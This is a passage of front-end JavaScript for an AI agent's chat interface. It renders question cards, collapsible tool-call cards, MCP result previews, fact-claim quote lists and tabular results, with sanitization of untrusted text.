    actions.appendChild(badge);
  }
}

/** Interactive card for an AskUserQuestion round-trip (question_request
 *  frame). Each question renders its options as toggle buttons plus an
 *  "Other…" free-text input; Submit sends every answer back in one
 *  ``question_answer`` frame (answers keyed by question text — the shape
 *  the runner returns to the agent SDK). Dedup/replay rules mirror
 *  renderApprovalRequest exactly. */
function renderQuestionRequest(frame) {
  if (!frame.request_id) return;
  if (answeredQuestionIds.has(frame.request_id)) return;
  if (document.querySelector(`[data-question-id="${CSS.escape(frame.request_id)}"]`)) return;
  const questions = Array.isArray(frame.questions) ? frame.questions : [];
  if (!questions.length) return;
  pendingQuestionFrames.set(frame.request_id, frame);
  clearThinkingPlaceholder();
  _sealStreamingSegment();

  const wrap = document.createElement("section");
  wrap.className = "cloud-chat-tool cloud-chat-question is-running";
  wrap.dataset.questionId = frame.request_id;

  const head = document.createElement("div");
  head.className = "cloud-chat-tool-head";
  const icon = document.createElement("span");
  icon.className = "cloud-chat-tool-icon cloud-chat-question-icon";
  icon.setAttribute("aria-hidden", "true");
  icon.textContent = "?";
  head.appendChild(icon);
  const name = document.createElement("span");
  name.className = "cloud-chat-tool-name";
  name.textContent = questions.length > 1 ? "Agnes has some questions" : "Agnes has a question";
  head.appendChild(name);
  wrap.appendChild(head);

  // Per-question selection state. `selected` holds chosen option labels
  // (Set — multiSelect keeps several); `other` the free-text alternative.
  const state = questions.map(() => ({ selected: new Set(), other: "" }));

  const answerOf = (i) => {
    const parts = [...state[i].selected];
    if (state[i].other.trim()) parts.push(state[i].other.trim());
    // Multi-select answers are comma-joined — the AskUserQuestion output
    // contract ("multi-select answers are comma-separated").
    return parts.join(", ");
  };

  const actions = document.createElement("div");
  const submitBtn = document.createElement("button");
  const updateSubmit = () => {
    submitBtn.disabled = !questions.every((_, i) => answerOf(i) !== "");
  };

  questions.forEach((q, i) => {
    const qq = q && typeof q === "object" ? q : {};
    const body = document.createElement("div");
    body.className = "cloud-chat-question-body";

    const qline = document.createElement("div");
    qline.className = "cloud-chat-question-q";
    if (qq.header) {
      const chip = document.createElement("span");
      chip.className = "cloud-chat-question-chip";
      chip.textContent = String(qq.header);
      qline.appendChild(chip);
    }
    const qtext = document.createElement("span");
    qtext.className = "cloud-chat-question-text";
    qtext.textContent = String(qq.question || "");
    qline.appendChild(qtext);
    if (qq.multiSelect) {
      const hint = document.createElement("span");
      hint.className = "cloud-chat-question-hint";
      hint.textContent = "Select all that apply";
      qline.appendChild(hint);
    }
    body.appendChild(qline);

    const opts = document.createElement("div");
    opts.className = "cloud-chat-question-options";
    const optButtons = [];
    (Array.isArray(qq.options) ? qq.options : []).forEach((opt) => {
      const oo = opt && typeof opt === "object" ? opt : {};
      const label = String(oo.label || "");
      if (!label) return;
      const b = document.createElement("button");
      b.type = "button";
      b.className = "cloud-chat-question-opt";
      b.setAttribute("aria-pressed", "false");
      const lbl = document.createElement("span");
      lbl.className = "cloud-chat-question-opt-label";
      lbl.textContent = label;
      b.appendChild(lbl);
      if (oo.description) {
        b.title = String(oo.description);
        const desc = document.createElement("span");
        desc.className = "cloud-chat-question-opt-desc";
        desc.textContent = String(oo.description);
        b.appendChild(desc);
      }
      b.onclick = () => {
        if (qq.multiSelect) {
          if (state[i].selected.has(label)) state[i].selected.delete(label);
          else state[i].selected.add(label);
        } else {
          const wasSelected = state[i].selected.has(label);
          state[i].selected.clear();
          state[i].other = "";
          otherInput.value = "";
          otherWrap.classList.remove("is-filled");
          if (!wasSelected) state[i].selected.add(label);
        }
        optButtons.forEach((btn) =>
          btn.el.setAttribute("aria-pressed", state[i].selected.has(btn.label) ? "true" : "false")
        );
        updateSubmit();
      };
      optButtons.push({ el: b, label });
      opts.appendChild(b);
    });

    // "Other" renders as a peer cell in the option grid — a <label>
    // wrapper (click anywhere in the cell focuses the input) around a
    // bare text input.
    const otherWrap = document.createElement("label");
    otherWrap.className = "cloud-chat-question-otherwrap";
    const otherLabel = document.createElement("span");
    otherLabel.className = "cloud-chat-question-opt-label";
    otherLabel.textContent = "Other";
    otherWrap.appendChild(otherLabel);
    const otherInput = document.createElement("input");
    otherInput.type = "text";
    otherInput.className = "cloud-chat-question-other";
    otherInput.placeholder = "Type your own answer…";
    otherInput.maxLength = 2000;
    otherInput.oninput = () => {
      state[i].other = otherInput.value;
      // "is-filled" mirrors answerOf's trimmed test, so the picked tint
      // never shows on whitespace the card would not accept.
      otherWrap.classList.toggle("is-filled", otherInput.value.trim() !== "");
      if (!qq.multiSelect && otherInput.value.trim()) {
        // Free text replaces a picked option on single-select questions.
        state[i].selected.clear();
        optButtons.forEach((btn) => btn.el.setAttribute("aria-pressed", "false"));
      }
      updateSubmit();
    };
    otherWrap.appendChild(otherInput);
    opts.appendChild(otherWrap);
    body.appendChild(opts);
    wrap.appendChild(body);
  });

  actions.className = "cloud-chat-question-actions";
  const sendAnswer = (payload) => {
    // Same wire guard as the approval buttons: only lock the card once the
    // frame is actually on the socket (review finding #1145).
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      setStatus("Not connected — reconnecting. Try answering again in a moment.", "warn");
      return false;
    }
    ws.send(JSON.stringify({ type: "question_answer", request_id: frame.request_id, ...payload }));
    wrap.querySelectorAll("button, input").forEach((x) => {
      x.disabled = true;
    });
    return true;
  };
  submitBtn.type = "button";
  submitBtn.className = "cloud-chat-question-btn is-submit";
  submitBtn.textContent = "Submit";
  submitBtn.disabled = true;
  submitBtn.onclick = () => {
    const answers = {};
    questions.forEach((q, i) => {
      const key = String((q && q.question) || "");
      const val = answerOf(i);
      if (key && val) answers[key] = val;
    });
    if (Object.keys(answers).length) sendAnswer({ answers });
  };
  actions.appendChild(submitBtn);
  const dismissBtn = document.createElement("button");
  dismissBtn.type = "button";
  dismissBtn.className = "cloud-chat-question-btn is-dismiss";
  dismissBtn.textContent = "Dismiss";
  dismissBtn.onclick = () => sendAnswer({ dismissed: true });
  actions.appendChild(dismissBtn);
  wrap.appendChild(actions);

  $("chat-messages").appendChild(wrap);
  maybeScrollToBottom();
}

function resolveQuestionCard(frame) {
  if (frame.request_id) {
    pendingQuestionFrames.delete(frame.request_id);
    answeredQuestionIds.add(frame.request_id);
  }
  const el = frame.request_id
    ? document.querySelector(`[data-question-id="${CSS.escape(frame.request_id)}"]`)
    : null;
  if (!el) return;
  el.classList.remove("is-running");
  el.querySelectorAll("button, input").forEach((x) => {
    x.disabled = true;
  });
  const labels = {
    answered: "Answered",
    dismissed: "Dismissed",
    timeout: "Timed out",
    cancelled: "Cancelled",
    unattended: "Unattended",
  };
  const answered = frame.decision === "answered";
  const actions = el.querySelector(".cloud-chat-question-actions");
  if (actions) {
    actions.textContent = "";
    const badge = document.createElement("span");
    badge.className = "cloud-chat-approval-outcome " + (answered ? "is-allow" : "is-deny");
    badge.textContent = labels[frame.decision] || frame.decision || "resolved";
    actions.appendChild(badge);
    if (answered && frame.answers && typeof frame.answers === "object") {
      // Echo what was chosen so the card reads as transcript after the
      // buttons are gone (an answer given on another device shows up too).
      // One chip per question; the answers map is keyed by question text,
      // which rides along as the chip's tooltip so a multi-question card
      // keeps each answer tied to what it answered.
      Object.entries(frame.answers).forEach(([question, val]) => {
        const chip = document.createElement("span");
        chip.className = "cloud-chat-question-answer-summary";
        chip.textContent = String(val);
        chip.title = String(question);
        actions.appendChild(chip);
      });
    }
  }
}

/** The tool card, shared by the live stream and the reload path so a
 *  refresh cannot silently downgrade to a different-looking block (it used
 *  to render a flat grey `tool: <label>` box instead — same information,
 *  none of the design).
 *
 *  `status`: "running" (live, awaiting its result) or "replayed" (rebuilt
 *  from a persisted part). A replayed card now renders its real outcome:
 *  since schema v123 the part carries `state` / `result` / `is_error`, so
 *  the icon, the status edge and the result body are the recorded ones. Two
 *  things it still cannot show, because nothing persists them: the duration
 *  (neither producer puts elapsed time on the wire — the client measures it
 *  live between the two frames) and, for a pre-v123 row, any outcome at all
 *  — `state` is absent there and the card stays deliberately neutral rather
 *  than claim a success the row cannot evidence.
 *
 *  <details>/<summary> — COLLAPSED by default: the header line (status,
 *  name, args summary, timing) is the transcript trail; one click opens the
 *  formatted args + result. A FAILED call opens itself. */
function _buildToolCard({ tool, args, status, state, result, isError }) {
  const wrap = document.createElement("details");
  // One status vocabulary for both paths: a replayed part's `state` maps onto
  // the same is-done / is-error classes a live result produces, so the card
  // cannot look like a different component depending on where it came from.
  let statusClass = "is-replayed";
  if (status === "running") statusClass = "is-running";
  else if (state === "output-error" || isError) statusClass = "is-error";
  else if (state === "output-available") statusClass = "is-done";
  const wrapIsError = statusClass === "is-error";
  wrap.className = `cloud-chat-tool ${statusClass}`;
  wrap.dataset.tool = tool || "";
  // A failed call opens itself — the error text is the one body a reader
  // must not have to know to click for. Same rule live and replayed.
  if (wrapIsError) wrap.open = true;

  // Header line — status + tool name + args summary. Always visible, even
  // collapsed: it's a <summary>, not a body element.
  const head = document.createElement("summary");
  head.className = "cloud-chat-tool-head";
  const icon = document.createElement("span");
  icon.className = "cloud-chat-tool-icon";
  icon.setAttribute("aria-hidden", "true");
  if (status === "running") icon.appendChild(iconEl("hourglass"));
  else if (wrapIsError) icon.appendChild(iconEl("triangle-alert"));
  else if (state === "output-available") icon.appendChild(iconEl("check"));
  if (icon.firstChild) head.appendChild(icon);

  // A semantic-layer lookup is the one tool call that is PROVENANCE rather
  // than plumbing: it says the answer you are reading was built on the
  // organization's agreed vocabulary, not on whatever the model assumed
  // "revenue" means. Rendered as a plain-language link to the definition
  // instead of a raw tool id, so the reader can check the wording without
  // leaving the conversation to go hunting for it.
  const definition = _definitionLookupLabel(tool);
  let name;
  if (definition) {
    name = document.createElement("a");
    name.href = definition.href;
    name.className = "cloud-chat-tool-name cloud-chat-tool-name--definition";
    name.textContent = definition.text;
    name.title = "Open your organization's definitions";
  } else {
    name = document.createElement("span");
    name.className = "cloud-chat-tool-name";
    name.textContent = _toolLabel(tool, args);
    name.title = tool || "";
  }
  head.appendChild(name);

  const summary = document.createElement("span");
  summary.className = "cloud-chat-tool-summary";
  summary.textContent = _summarizeArgs(args);
  head.appendChild(summary);

  if (status === "running") {
    const meta = document.createElement("span");
    meta.className = "cloud-chat-tool-meta";
    meta.textContent = "running…";
    head.appendChild(meta);
  }

  // Chevron — the only visual cue once collapsed that this header still
  // hides a body. .cloud-chat-tool-head sets display:flex, which drops the
  // <summary>'s native disclosure marker, so the affordance has to be explicit.
  const chevron = document.createElement("span");
  chevron.className = "cloud-chat-tool-chevron";
  chevron.setAttribute("aria-hidden", "true");
  chevron.appendChild(iconEl("chevron-right"));
  head.appendChild(chevron);

  wrap.appendChild(head);

  // Args — formatted JSON, visible the moment the card is expanded. The
  // card header is the one click now; the old nested args toggle inside a
  // collapsed card was two clicks to see what a tool was asked to do.
  if (args && Object.keys(args).length > 0) {
    wrap.appendChild(_jsonPanel("Args", args, "cloud-chat-tool-args"));
  }

  // A replayed card's result, from the persisted part. Routed through the
  // SAME preview builder the live path uses in renderToolCallEnd, so a table
  // is a table and an MCP envelope is unwrapped on both paths — the card is
  // one component with one body, not two that resemble each other. `tool`
  // is passed through so a replayed `fact_claims` card gets the SAME
  // bespoke quote/document preview a live one does (see
  // _renderFactClaimsPreview) instead of a generic JSON dump.
  if (status !== "running" && result !== undefined) {
    const body = _renderToolResultPreview(result, tool);
    if (body) wrap.appendChild(body);
  }
  return wrap;
}

function renderToolCallStart(frame) {
  clearThinkingPlaceholder();
  // The card lands AFTER the streamed text so far and any further text
  // belongs below it — seal the streaming bubble first (#1504: the
  // transcript keeps the frame order, text → card → text).
  _sealStreamingSegment();
  const wrap = _buildToolCard({ tool: frame.tool, args: frame.args, status: "running" });
  wrap.dataset.startedAt = String(performance.now());
  $("chat-messages").appendChild(wrap);
  inFlightToolCalls.set(_toolCallId(frame), wrap);
  _currentTurnToolCards.push(wrap);
  maybeScrollToBottom();
  $("cancel-btn").hidden = false;
}

function renderToolCallEnd(frame) {
  const id = _toolCallId(frame);
  const wrap = inFlightToolCalls.get(id);
  if (!wrap) return;
  inFlightToolCalls.delete(id);

  // Status update — error/cancel surfaced; otherwise success.
  const result = frame.result;
  // The producer's own verdict wins when it sent one (`is_error`, emitted by
  // both the native runner and the engine provider). _looksLikeToolError is
  // the fallback for a frame without it — a heuristic over the payload text,
  // which silently passed real failures whose message starts anywhere other
  // than "error"/"traceback" ("Catalog Error: Table … does not exist").
  const isError = typeof frame.is_error === "boolean" ? frame.is_error : _looksLikeToolError(result);
  wrap.classList.remove("is-running");
  wrap.classList.add(isError ? "is-error" : "is-done");
  // A FAILED call opens itself: cards start collapsed, and the error text
  // is the one body a reader must not have to know to click for.
  if (isError) wrap.open = true;
  const icon = wrap.querySelector(".cloud-chat-tool-icon");
  if (icon) icon.replaceChildren(iconEl(isError ? "triangle-alert" : "check"));

  // Timing meta — "running…" → "1.2s" if we tracked startedAt.
  const meta = wrap.querySelector(".cloud-chat-tool-meta");
  if (meta) {
    const startedAt = parseFloat(wrap.dataset.startedAt || "");
    if (Number.isFinite(startedAt)) {
      const elapsedMs = performance.now() - startedAt;
      meta.textContent = elapsedMs > 1000
        ? `${(elapsedMs / 1000).toFixed(1)}s`
        : `${Math.round(elapsedMs)}ms`;
    } else {
      meta.textContent = isError ? "failed" : "done";
    }
  }

  // Result body — the new bit. Picks a preview shape based on the
  // payload: tabular → mini-table; string → snippet; everything else
  // → JSON code block. Full payload is always reachable via the
  // "Show full result" toggle even if the preview is truncated.
  //
  // `wrap.dataset.tool` (not `frame.tool`, which for a tool_result frame is
  // often the CALL ID, not the name — see the tool_result case's own
  // comment) is the reliable tool name: `_buildToolCard` stamped it at
  // tool_call time. Facts-graph evidence (fact_claims only — search/
  // neighbors carry no document identifiers) is recorded here too, once per
  // result, for the end-of-turn scope-line footer (see
  // _recordFactClaimsEvidence / finalizeAssistantMessage).
  const toolName = wrap.dataset.tool;
  if (_bareToolName(toolName) === "fact_claims") {
    _recordFactClaimsEvidence(_asToolResultObject(result));
  }
  const body = _renderToolResultPreview(result, toolName);
  if (body) wrap.appendChild(body);

  maybeScrollToBottom();
}

/** Fold every tool-call card of the turn that just ended back down to its
 *  header line. Cards start collapsed now, so this mostly restores the ones
 *  the user (or an error) expanded mid-turn. Called once per turn, from each
 *  of handleFrame's terminal cases (done / cancelled / error /
 *  confirmation_required) — a turn that stops for any reason leaves behind
 *  the same settled transcript: the answer (or note) plus a scannable trail
 *  of "what ran", not an expanded dump of every stdout/stderr sitting under
 *  the finished answer. Each card's own <details> toggle still opens it
 *  back up on click.
 *
 *  A FAILED card is left open. `renderToolCallEnd` marks it `is-error` (red
 *  border, warning icon) precisely because its output is the thing the reader
 *  needs, and the `error` terminal case is the one where that matters most: a
 *  turn that died mid-tool would otherwise fold shut the very card explaining
 *  why, behind a click nobody knows to make. Folding is for the noise, not
 *  for the diagnosis. */
function _collapseFinishedToolCalls() {
  for (const wrap of _currentTurnToolCards) {
    if (wrap.classList.contains("is-error")) continue;
    wrap.open = false;
  }
  _currentTurnToolCards = [];
  // Defensive: the normal path resets facts-turn evidence inside
  // `renderFactsScopeLine` once it has been read. A turn that ends WITHOUT
  // ever reaching `finalizeAssistantMessage` (cancelled/error/confirmation_
  // required before any assistant text) would otherwise leak this turn's
  // tally into the next one's footer — a no-op when already empty.
  _resetFactsTurnEvidence();
}

/** Heuristic: a stringified tool error coming back from the agent SDK
 *  often starts with "error:" / "Error:" or contains "is_error":true
 *  when it's a JSON object. Best-effort — we just need a signal to
 *  switch the icon. */
function _looksLikeToolError(result) {
  if (result == null) return false;
  if (typeof result === "string") {
    const head = result.trim().slice(0, 12).toLowerCase();
    return head.startsWith("error") || head.startsWith("traceback");
  }
  if (typeof result === "object") {
    if (result.is_error === true) return true;
    if (typeof result.error === "string" && result.error.length > 0) return true;
  }
  return false;
}

/** {content: [{type:"text", text}, …]} — the MCP result envelope
 *  (the kai-agent provider delivers it verbatim; the sandbox runner
 *  usually pre-joins). The reader cares about the payload, not the
 *  envelope: join the text blocks, and if the joined text is itself
 *  JSON hand back the parsed value, so it renders as formatted JSON —
 *  or even a table — instead of a string-in-a-string with escaped
 *  newlines. A result that arrives as a JSON *string* is inspected too
 *  — handleFrame's parse is a local for the preview-directive check and
 *  never reaches this layer.
 *
 *  Narrowly scoped on purpose: a string is only replaced when it turns
 *  out to BE an envelope. A JSON string that is anything else (a tool
 *  returning `agnes … --json` output, say) is handed back verbatim so it
 *  keeps its existing string/markdown rendering — parsing every
 *  JSON-shaped string here would quietly re-route unrelated tools
 *  through the table/JSON panel, which is a bigger behaviour change than
 *  this function is for. */
function _unwrapMcpEnvelope(result) {
  if (typeof result === "string") {
    let parsed;
    try {
      parsed = JSON.parse(result);
    } catch (_e) {
      return result;
    }
    // Only an envelope earns the substitution; everything else keeps the
    // string it arrived as.
    if (!parsed || typeof parsed !== "object" || !Array.isArray(parsed.content)) return result;
    result = parsed;
  }
  if (!result || typeof result !== "object" || !Array.isArray(result.content)) return result;
  if (result.content.length === 0) return result;
  if (!result.content.every((b) => b && b.type === "text" && typeof b.text === "string")) {
    return result;
  }
  const text = result.content.map((b) => b.text).join("\n");
  try {
    return JSON.parse(text);
  } catch (_e) {
    return text;
  }
}

/** Best-effort "give me the parsed JSON object" for a tool result,
 *  regardless of which of the three shapes it arrived in: an already-parsed
 *  object, a genuine `{content:[{type:"text",text}]}` MCP envelope (handled
 *  by `_unwrapMcpEnvelope`), or — the shape the runner's own comment on the
 *  `tool_result` case above documents — a raw JSON STRING with no envelope
 *  at all (the runner already joined the content blocks server-side).
 *  `_unwrapMcpEnvelope` alone leaves that third shape as a string (it only
 *  substitutes when it recognizes an envelope), which is fine for the
 *  generic preview but wrong for a shape-checking caller like
 *  `_renderFactClaimsPreview`, so this tries a direct parse FIRST. Returns
 *  the original value unchanged if neither path yields an object. */
function _asToolResultObject(result) {
  if (typeof result === "string") {
    try {
      const parsed = JSON.parse(result);
      if (parsed && typeof parsed === "object") return parsed;
    } catch (_e) {
      /* not JSON */
    }
  }
  return _unwrapMcpEnvelope(result);
}

/** Fact-graph evidence gathered from `fact_claims` tool results during the
 *  turn in progress — the ONLY fact tool whose response names documents
 *  (`fact_search`/`fact_neighbors` don't carry document identifiers, so
 *  they contribute nothing here). Read once at the end of the turn by
 *  `renderFactsScopeLine` and reset there — see its docstring for the full
 *  mechanism and its honesty note. */
let _turnFactDocumentIds = new Set();
let _turnFactCollectionIds = new Set();

function _resetFactsTurnEvidence() {
  _turnFactDocumentIds = new Set();
  _turnFactCollectionIds = new Set();
}

function _recordFactClaimsEvidence(result) {
  if (!result || typeof result !== "object" || !Array.isArray(result.claims)) return;
  for (const claim of result.claims) {
    if (claim && claim.corpus_file_id) _turnFactDocumentIds.add(claim.corpus_file_id);
    if (claim && claim.corpus_id) _turnFactCollectionIds.add(claim.corpus_id);
  }
}

/** The `fact_claims` tool result's bespoke preview (design doc §13.2
 *  "Chat"): each claim's verbatim quote + evidencing document name, with an
 *  "Open in source" link only when `document.source_url` is present. Falls
 *  back to `null` (letting the generic renderer take over) for anything
 *  that isn't the expected `{claims: [...], revealed}` shape — an error
 *  payload (e.g. `{detail: "fact_not_found"}`) still needs to be shown
 *  somehow, and the generic JSON panel is the honest way to show it. */
function _renderFactClaimsPreview(result) {
  if (!result || typeof result !== "object" || !Array.isArray(result.claims)) return null;
  const wrap = document.createElement("div");
  wrap.className = "cloud-chat-tool-result is-fact-claims";

  if (result.revealed) {
    const note = document.createElement("p");
    note.className = "cloud-chat-fact-claims-note";
    note.textContent = "Corrected by an admin — shown without its original quotes.";
    wrap.appendChild(note);
  }

  if (result.claims.length === 0) {
    const empty = document.createElement("p");
    empty.className = "cloud-chat-fact-claims-note";
    empty.textContent = "No readable evidence for this fact.";
    wrap.appendChild(empty);
    return wrap;
  }

  const list = document.createElement("ul");
  list.className = "cloud-chat-fact-claims-list";
  for (const claim of result.claims) {
    const item = document.createElement("li");
    item.className = "cloud-chat-fact-claim";

    // Verbatim evidence text extracted from a document is untrusted content
    // — the SAME sanitizer every other rendered message body goes through
    // (security playbook: never raw innerHTML for untrusted text).
    const quote = document.createElement("blockquote");
    quote.className = "cloud-chat-fact-claim-quote";
    quote.innerHTML = renderMarkdownSafe((claim && claim.quote) || "");
    item.appendChild(quote);

    const meta = document.createElement("div");
    meta.className = "cloud-chat-fact-claim-meta";
    const docName = (claim && claim.document && claim.document.name) || (claim && claim.corpus_file_id) || "document";
    const docSpan = document.createElement("span");
    docSpan.className = "cloud-chat-fact-claim-doc";
    docSpan.textContent = docName;
    meta.appendChild(docSpan);

    const sourceUrl = claim && claim.document && claim.document.source_url;
    if (sourceUrl && _SAFE_URL_SCHEME_RE.test(String(sourceUrl).trim())) {
      const link = document.createElement("a");
      link.className = "cloud-chat-fact-claim-source";
      link.href = sourceUrl;
      link.target = "_blank";
      link.rel = "noopener noreferrer";
      link.textContent = "Open in source";
      meta.appendChild(link);
    }
    item.appendChild(meta);
    list.appendChild(item);
  }
  wrap.appendChild(list);
  return wrap;
}

/** Build the preview block for a tool result. The CLI tools route
 *  most JSON / table output via agnes which speaks Markdown — so
 *  result strings often contain `|---|---|` table markup that
 *  marked.parse() can render natively. We:
 *
 *  1. unwrap an MCP text envelope down to its payload;
 *  2. attempt to extract a tabular preview from a parsed JSON result
 *     (array of objects, or a {columns, rows} shape);
 *  3. fall back to running ``marked.parse`` over a string result so
 *     embedded Markdown tables get rendered as real <table>s with the
 *     `.ds-table` sort+sticky-header enhancement; and
 *  4. render everything else as a formatted, highlighted JSON block —
 *     shown directly: the collapsed card's header is the one click.
 *
 *  Returns a DOM element ready to append, or null if the result is
 *  empty.
 *
 *  `toolName` (optional) routes ONE tool — `fact_claims` — through a
 *  bespoke preview instead of this generic ladder (design doc §13.2
 *  "Chat"): the endpoint that carries quotes/documents reads far better as
 *  a quote list than as a JSON dump or an accidental table. `fact_search`/
 *  `fact_neighbors` are left on the generic path — their JSON already reads
 *  fine here, and they get their human head from `_TOOL_LABELS` alone.
 */
function _renderToolResultPreview(result, toolName) {
  if (result == null || result === "") return null;

  if (_bareToolName(toolName) === "fact_claims") {
    const preview = _renderFactClaimsPreview(_asToolResultObject(result));
    if (preview) return preview;
    // Unexpected shape (e.g. an error payload) — fall through to the
    // generic renderer below rather than showing nothing.
  }

  result = _unwrapMcpEnvelope(result);
  if (result == null || result === "") return null;

  // Already-tabular JSON shapes — render a real <table> preview.
  const table = _coerceToTablePreview(result);
  if (table) return table;

  // String result. Most agnes CLI tool output is Markdown-ish; let
  // marked.parse() try to render it.
  if (typeof result === "string") {
    const wrap = document.createElement("div");
    wrap.className = "cloud-chat-tool-result is-text";

    const preview = result.length > _TOOL_RESULT_TEXT_PREVIEW_CHARS
      ? result.slice(0, _TOOL_RESULT_TEXT_PREVIEW_CHARS) + "…"
      : result;

    const previewBody = document.createElement("div");
    previewBody.className = "cloud-chat-tool-result-preview";
    try {
      previewBody.innerHTML = renderMarkdownSafe(preview);
      enhanceCodeBlocks(previewBody);
      enhanceTables(previewBody);
    } catch (_) {
      previewBody.textContent = preview;
    }
    wrap.appendChild(previewBody);

    if (result.length > _TOOL_RESULT_TEXT_PREVIEW_CHARS) {
      const det = document.createElement("details");
      det.className = "cloud-chat-tool-result-full";
      const sum = document.createElement("summary");
      sum.textContent = "Show full result";
      det.appendChild(sum);
      const full = document.createElement("div");
      full.className = "cloud-chat-tool-result-full-body";
      try {
        full.innerHTML = renderMarkdownSafe(result);
        enhanceCodeBlocks(full);
        enhanceTables(full);
      } catch (_) {
        const pre = document.createElement("pre");
        pre.textContent = result;
        full.appendChild(pre);
      }
      det.appendChild(full);
      wrap.appendChild(det);
    }
    return wrap;
  }

  // Everything else — formatted, highlighted JSON, rendered directly. The
  // card itself starts collapsed, so its header is already the "one click
  // away" that a nested Structured-result toggle used to provide; opening
  // the card must show what the tool returned, not offer a second click.
  const wrap = document.createElement("div");
  wrap.className = "cloud-chat-tool-result is-json";
  wrap.appendChild(_jsonPanel("Result", result, "cloud-chat-tool-json"));
  return wrap;
}

/** Try to coerce a tool result into a [{col: val}…] shape and render
 *  the first N rows as a real <table>. Returns null if the result
 *  doesn't look tabular. Recognised shapes:
 *
 *    - ``[{a: 1, b: 2}, {a: 3, b: 4}]``  — array of homogeneous objects
 *    - ``{columns: ["a","b"], rows: [[1,2],[3,4]]}`` — DuckDB-ish
 *    - ``{data: [{...}, {...}]}`` — wrapping envelope used by some tools
 */
const _TOOL_RESULT_FULL_ROWS_MAX = 500;

function _buildResultTable(columns, rows) {
  const table = document.createElement("table");
  const thead = document.createElement("thead");
  const headRow = document.createElement("tr");
  for (const c of columns) {
    const th = document.createElement("th");
    th.textContent = c;
    headRow.appendChild(th);
  }
  thead.appendChild(headRow);
  table.appendChild(thead);
  const tbody = document.createElement("tbody");
  for (const r of rows) {
    const tr = document.createElement("tr");
    for (const c of columns) {
      const td = document.createElement("td");
      const v = r[c];
      td.textContent = v == null ? "" : typeof v === "object" ? JSON.stringify(v) : String(v);
      tr.appendChild(td);
    }
    tbody.appendChild(tr);
  }
  table.appendChild(tbody);
  return table;
}

function _coerceToTablePreview(result) {
  let rows = null;
  let columns = null;

  if (Array.isArray(result) && result.length > 0 && typeof result[0] === "object" && result[0] !== null) {
    rows = result.map(r => ({ ...r }));
    columns = Object.keys(result[0]);
  } else if (result && typeof result === "object") {
    if (Array.isArray(result.rows) && Array.isArray(result.columns)) {
      columns = result.columns.map(String);
      rows = result.rows.map(r => {
        const obj = {};
        for (let i = 0; i < columns.length; i++) obj[columns[i]] = r[i];
        return obj;
      });
    } else if (Array.isArray(result.data) && result.data.length > 0
               && typeof result.data[0] === "object") {
      rows = result.data.map(r => ({ ...r }));
      columns = Object.keys(result.data[0]);
    }
  }

  if (!rows || !columns || rows.length === 0) return null;

  const total = rows.length;
  const preview = rows.slice(0, _TOOL_RESULT_PREVIEW_ROWS);

  const wrap = document.createElement("div");
  wrap.className = "cloud-chat-tool-result is-table";

  const tableWrap = document.createElement("div");
  tableWrap.className = "cloud-chat-table-wrap";
  tableWrap.appendChild(_buildResultTable(columns, preview));
  wrap.appendChild(tableWrap);

  // The expansion is a REAL table too — the same shape the preview showed,
  // just all of it (capped so a huge result can't flood the DOM). It used to
  // be a JSON dump, which contradicted the preview right above it.
  if (total > preview.length) {
    const meta = document.createElement("p");
    meta.className = "cloud-chat-tool-result-meta";
    meta.textContent = `Showing ${preview.length} of ${total} rows.`;
    wrap.appendChild(meta);
    const det = document.createElement("details");
    det.className = "cloud-chat-tool-result-full";
    const sum = document.createElement("summary");
    const shown = Math.min(total, _TOOL_RESULT_FULL_ROWS_MAX);
    sum.textContent = total > _TOOL_RESULT_FULL_ROWS_MAX
      ? `Show first ${shown} of ${total} rows`
      : `Show all ${total} rows`;
    det.appendChild(sum);
    const fullWrap = document.createElement("div");
    fullWrap.className = "cloud-chat-table-wrap";
    fullWrap.appendChild(_buildResultTable(columns, rows.slice(0, _TOOL_RESULT_FULL_ROWS_MAX)));
    det.appendChild(fullWrap);
    wrap.appendChild(det);
    enhanceTables(det);

    // Past the cap the table genuinely drops rows — keep a route to ALL of
    // them (the old JSON dump had them; the cap must not lose data). Built
    // lazily on first open so a huge dump costs no memory or DOM until
    // asked for, and via textContent so the payload can never execute.
    if (total > _TOOL_RESULT_FULL_ROWS_MAX) {
      const rawDet = document.createElement("details");
      rawDet.className = "cloud-chat-tool-result-full";
      const rawSum = document.createElement("summary");
      rawSum.textContent = `Raw JSON (all ${total} rows)`;
      rawDet.appendChild(rawSum);
      const rawPre = document.createElement("pre");
      const rawCode = document.createElement("code");
      rawPre.appendChild(rawCode);
      rawDet.appendChild(rawPre);
      let rawFilled = false;
      rawDet.addEventListener("toggle", () => {
        if (!rawDet.open || rawFilled) return;
        rawFilled = true;
        rawCode.textContent = JSON.stringify(rows, null, 2);
      });
      wrap.appendChild(rawDet);
    }
  }

  enhanceTables(wrap);
  return wrap;
}

// ---------- Data-app split-pane preview ----------------------------------
// The four `agnes_data_app_preview` / `_refresh` / `_close` / `_credentials`
// chat-surface MCP tools (wave-3C) don't render as generic tool blocks —
// their `tool_result.result` carries a render directive (fixed JSON
// contract, see docs/superpowers/plans/2026-07-27-data-apps-wave3c-
// preview-extras.md) that drives a persistent split pane next to the
// chat thread instead:
//
//   {render:"data_app_preview", slug, url: null|"/apps/<slug>/"}
//   {render:"data_app_preview_refresh", slug}
//   {render:"data_app_preview_close", slug}
//   {render:"data_app_credentials", slug, url, password}
//
// `url:null` opens the pane immediately with a placeholder (spec §7
// mandate — the user sees something is happening before the app container
// is actually up); the follow-up call with a real `url` swaps the pane to
// the live iframe. The preview cookie (when present) is applied to the
// app origin BEFORE the iframe loads, never as a URL query parameter —
// putting a capability token in `iframe.src` would leak it via browser
// history/referrer, and the proxy's preview-token branch expects a cookie
// or Authorization header, not a query string.

const _PREVIEW_TOOL_NAMES = new Set([
  "agnes_data_app_preview",
  "agnes_data_app_refresh",
  "agnes_data_app_close",
  "agnes_data_app_credentials",
]);

/** MCP tools arrive name-prefixed (`mcp__<server>__agnes_data_app_preview`), so
 *  match on the bare name after the last `__` — a plain Set.has() on the prefixed
 *  name never hits, which would leave the suppressed "running…" tool block
 *  spinning forever (its result is routed to the preview pane, not renderToolCallEnd). */
// Tool calls that mean "the agent consulted the organization's governed
// vocabulary", mapped to what a reader should see instead of the tool id.
//
// Only `glossary_search` qualifies today, and deliberately so: it is the one
// call whose mere occurrence proves a definition was read. `knowledge_search`
// can also return metric and glossary hits, but it searches tables, documents
// and memory in the same breath — whether any definition came back is a
// property of its RESULT, not its invocation, so labelling the call would
// claim provenance that may not exist. Citing the specific definition an
// answer used (rather than noting that one was consulted) is issue #1134.
const _DEFINITION_LOOKUP_TOOLS = {
